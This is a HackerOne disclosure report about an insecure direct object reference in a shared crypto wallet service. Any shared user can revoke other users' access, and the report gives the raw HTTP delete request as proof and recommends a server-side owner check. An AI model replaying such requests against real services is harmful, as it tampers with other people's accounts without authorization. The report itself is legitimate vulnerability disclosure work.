# HackerOne Report: IDOR on remoing Share
**Report ID:** 85720
**Vulnerability Class:** Violation of Secure Design Principles

## Vulnerability Information & PoC
**Issue**
In case of Operator Wallets, only `Owner` has the permission to delete share with any user. But It is possible for any user to delete share for any other user.

**POC**
1. Suppose a wallet `BITCOINS` is created by user A and shared with user B and C.
2. User B can send the following request and delete User C as there are no server side verifications

    POST /dashboard/account/<accountID>/sharing/delete HTTP/1.1
    Host: wallet.romit.io
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: https://wallet.romit.io/dashboard
    Content-Length: 90
    Cookie: <redatcted>
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache

    bankUserId=<User C's ID>&_csrf=3b919c4a-776f-4144-84b7-88d315f57815

**Solution**
Verify that the user who is deleting the user is actually an owner for that wallet.

Thanks
Sparsh

## Discussion & Remediation Timeline
